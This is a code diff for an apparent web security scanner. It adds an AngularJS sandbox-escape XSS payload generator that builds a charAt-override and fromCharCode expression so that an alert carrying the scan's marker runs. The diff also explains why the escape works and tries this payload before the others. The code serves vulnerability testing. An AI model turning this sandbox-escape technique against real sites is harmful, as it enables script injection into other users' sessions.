@@ -232,6 +232,12 @@ const (
 	// the expression must travel as the parameter NAME. See
 	// domXSSAngularParseExpression for the quote-free construction.
 	domXSSShapeAngularParseExpression = "angular_parse_expression"
+	// domXSSShapeAngularSandboxEscape is the parameter-NAME binding taken one
+	// step further: the expression breaks out of the AngularJS sandbox and
+	// EVALUATES CODE, so the alert in it actually runs. Compilation alone
+	// (angular_parse_expression) proves the injection; only this shape proves
+	// execution on a page whose sandbox otherwise blocks globals.
+	domXSSShapeAngularSandboxEscape = "angular_sandbox_escape"
 )
 
 // DOMXSSShapeNeedsParameterName reports whether shape reaches its sink only
@@ -239,7 +245,7 @@ const (
 // instead of inspecting the candidate value: the delivery is a property of the
 // mechanism, not of the bytes.
 func DOMXSSShapeNeedsParameterName(shape string) bool {
-	return shape == domXSSShapeAngularParseExpression
+	return shape == domXSSShapeAngularParseExpression || shape == domXSSShapeAngularSandboxEscape
 }
 
 // domXSSAngularParseExpression builds the quote-free Angular expression for
@@ -291,6 +297,32 @@ func domXSSAngularParseExpression(marker string) (string, bool) {
 		terms = append(terms, "("+strconv.Itoa(digit)+").toString(36)")
 	}
 	return "[" + strings.Join(terms, ",") + "].join([])", true
+}
+
+// domXSSAngularSandboxEscape builds the published AngularJS sandbox-escape
+// expression for marker. The shape is PortSwigger's own solution technique:
+//
+//	toString().constructor.prototype.charAt=[].join;
+//	[1]|orderBy:toString().constructor.fromCharCode(<codes of "x=alert('<marker>')">)
+//
+// toString() yields a string without quotes; its constructor property reaches
+// the String prototype, and overwriting charAt breaks the sandbox's guard so
+// the filter argument is allowed through. fromCharCode then assembles
+// x=alert('<marker>') out of character codes — no quote, bracket or keyword
+// survives as a literal, which is what defeats the sandbox's expression filter.
+// The generated code carries the scan's own marker, so the dialog it produces is
+// attributable to this candidate and to nothing the page echoes.
+func domXSSAngularSandboxEscape(marker string) (string, bool) {
+	if len(marker) < 4 {
+		return "", false
+	}
+	code := "x=alert('" + marker + "')"
+	codes := make([]string, 0, len(code))
+	for i := 0; i < len(code); i++ {
+		codes = append(codes, strconv.Itoa(int(code[i])))
+	}
+	return "toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(" +
+		strings.Join(codes, ",") + ")", true
 }
 
 // domXSSAngularInterpolation builds the {{...}} candidate for marker. The
@@ -413,7 +445,18 @@ func DOMXSSPayloadsFor(source DOMXSSSource, sink DOMXSSSink, marker string) []Ca
 		if !ok {
 			return nil
 		}
-		cands := []Candidate{domXSSPayloadCandidate(source, sink, domXSSShapeAngularInterpolation, value, domXSSAngularRationale(source, sink))}
+		// Order matters: the executor stops at the first shape that confirms,
+		// so the shape that proves EXECUTION (a dialog from real code) must be
+		// tried before the shapes that only prove COMPILATION — otherwise a
+		// page that compiles the interpolation would end the attempt before
+		// the escape is ever sent.
+		var cands []Candidate
+		if source == DOMSourceQuery {
+			if expr, ok := domXSSAngularSandboxEscape(marker); ok {
+				cands = append(cands, domXSSPayloadCandidate(source, sink, domXSSShapeAngularSandboxEscape, expr, domXSSAngularSandboxRationale(source, sink)))
+			}
+		}
+		cands = append(cands, domXSSPayloadCandidate(source, sink, domXSSShapeAngularInterpolation, value, domXSSAngularRationale(source, sink)))
 		// The parameter-NAME binding is a QUERY-source channel only: a
 		// parameter name is something a URL carries, and no other source has
 		// one. It is planned second, so a page whose text-node interpolation
@@ -3225,4 +3268,13 @@ func domXSSAngularParseRationale(source DOMXSSSource, sink DOMXSSSink) string {
 		"The expression builds the marker from decimal number literals alone ((18).toString(36) is 'i', join([]) concatenates with an empty separator): the page rewrites both quote styles to character references inside its inline script and AngularJS 1.4.4 has no hex literals, so no string literal can be used. " +
 		"The candidate bytes never contain the marker contiguously, and no quote, global, constructor/prototype access, alert, cookie or network call is involved — this needs no sandbox escape and performs none. " +
 		"A document whose Content-Security-Policy refuses dynamic evaluation is reported as the same distinct csp_blocked outcome as the interpolation shape." + storageControlCaveat
+}
+
+// domXSSAngularSandboxRationale explains the escape shape: what it does, why it
+// is marker-specific, and — the point of the shape — that the observation is
+// EXECUTION, not compilation.
+func domXSSAngularSandboxRationale(source DOMXSSSource, sink DOMXSSSink) string {
+	how, storageCaveat := domXSSSourceRoute(source)
+	return how + " is handed to AngularJS's $parse as the expression NAME, and the expression ESCAPES the AngularJS sandbox: toString() produces a string without a quote, its constructor property reaches the String prototype, and overwriting charAt blinds the sandbox's guard so the orderBy filter argument is evaluated as code. fromCharCode then assembles x=alert('<marker>') out of character codes, so no quote, bracket or keyword appears as a literal in the candidate. " +
+		"Confirmation requires the resulting JavaScript DIALOG to carry this scan's marker: a dialog can only exist if the code actually RAN, and the page cannot produce one by echoing text. This is the shape that proves execution on a page whose sandbox blocks compilation-only payloads; compilation alone is claimed by the interpolation and parse-expression shapes." + storageCaveat
 }
